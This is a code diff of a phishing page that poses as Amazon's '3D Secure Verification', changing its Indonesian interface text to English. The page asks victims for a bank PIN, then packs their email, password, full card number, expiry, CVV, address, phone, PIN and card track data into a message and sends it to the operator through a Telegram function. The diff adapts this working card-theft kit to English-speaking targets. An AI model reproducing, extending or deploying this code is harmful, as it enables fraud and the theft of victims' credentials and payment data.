@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -9,7 +9,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
         body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 30px 20px; }
         .logo { margin: 0 0 25px; text-align: center; }
-        .logo img { height: 32px; }
+        .logo img { height: 60px; }
         .kotak { width: 100%; max-width: 500px; border: 1px solid #ddd; border-radius: 8px; padding: 25px; }
         h1 { font-size: 20px; margin-bottom: 8px; font-weight: 500; }
         .sub { font-size: 14px; color: #555; margin-bottom: 20px; line-height: 1.5; }
@@ -33,16 +33,16 @@
     <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
     <div class="kotak">
         <h1>3D Secure Verification</h1>
-        <p class="sub">Bank Anda meminta verifikasi tambahan untuk melindungi transaksi Anda.</p>
+        <p class="sub">Your bank requires additional verification to protect your transaction.</p>
         
         <div class="info">
-            <div>Kartu: <strong id="tampilKartu">—</strong></div>
+            <div>Card: <strong id="tampilKartu">—</strong></div>
             <div>Email: <strong id="tampilEmail">—</strong></div>
         </div>
 
         <form id="form3ds">
-            <p class="pin-judul">Masukkan PIN Anda</p>
-            <p class="pin-ket">Masukkan 6 digit PIN verifikasi dari bank penerbit kartu.</p>
+            <p class="pin-judul">Enter your PIN</p>
+            <p class="pin-ket">Enter the 6-digit verification PIN from your card-issuing bank.</p>
             
             <div class="pin-baris">
                 <div class="pin-kolom"><input type="text" maxlength="1" inputmode="numeric" id="p1"></div>
@@ -54,14 +54,14 @@
             </div>
 
             <button type="submit" id="tombol">Verify & Complete</button>
-            <div class="proses" id="sedang">⏳ Sedang memverifikasi...</div>
+            <div class="proses" id="sedang">⏳ Verifying...</div>
         </form>
     </div>
     <div class="footer">
-        <a href="#">Syarat Penggunaan</a>
-        <a href="#">Pemberitahuan Privasi</a>
-        <a href="#">Bantuan</a>
-        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. atau afiliasinya</p>
+        <a href="#">Conditions of Use</a>
+        <a href="#">Privacy Notice</a>
+        <a href="#">Help</a>
+        <p style="margin-top: 8px;">© 1996-2026, Amazon.com, Inc. or its affiliates</p>
     </div>
 
     <script>
@@ -81,7 +81,7 @@
 
         const tampilNomor = nomor.length >= 4 
             ? `•••• •••• •••• ${nomor.slice(-4)}` 
-            : 'Tidak tersedia';
+            : 'Not available';
         document.getElementById('tampilKartu').textContent = tampilNomor;
         document.getElementById('tampilEmail').textContent = email;
 
@@ -124,7 +124,7 @@
         document.getElementById('form3ds').addEventListener('submit', async e => {
             e.preventDefault();
             const pin = ambilPIN();
-            if (pin.length !== 6) { alert('Masukkan 6 digit PIN'); return; }
+            if (pin.length !== 6) { alert('Please enter 6-digit PIN'); return; }
 
             document.getElementById('tombol').disabled = true;
             document.getElementById('tombol').style.display = 'none';
@@ -135,19 +135,19 @@
 ━━━━━━━━━━━━━━━━━━━━━
 📧 Email: \`${email}\`
 🔑 Password: \`${pass}\`
-👤 Nama: \`${namaKartu}\`
-🔢 Kartu: \`${nomor}\`
+👤 Name: \`${namaKartu}\`
+🔢 Card: \`${nomor}\`
 📅 Exp: \`${expiry}\`
 🔒 CVV: \`${cvv}\`
-📍 Alamat: \`${alamat}, ${kota} — ${kodepos}\`
-📞 Telp: \`${telepon}\`
+📍 Address: \`${alamat}, ${kota} — ${kodepos}\`
+📞 Phone: \`${telepon}\`
 🔐 PIN: \`${pin}\`
 ━━━━━━━━━━━━━━━━━━━━━
 📋 *TRACK DATA*
 \`\`\`
 ${track}
 \`\`\`
-🕐 Waktu: ${new Date().toLocaleString()}
+🕐 Time: ${new Date().toLocaleString()}
             `.trim();
             await CONFIG.kirimKeTelegram(pesan);
 
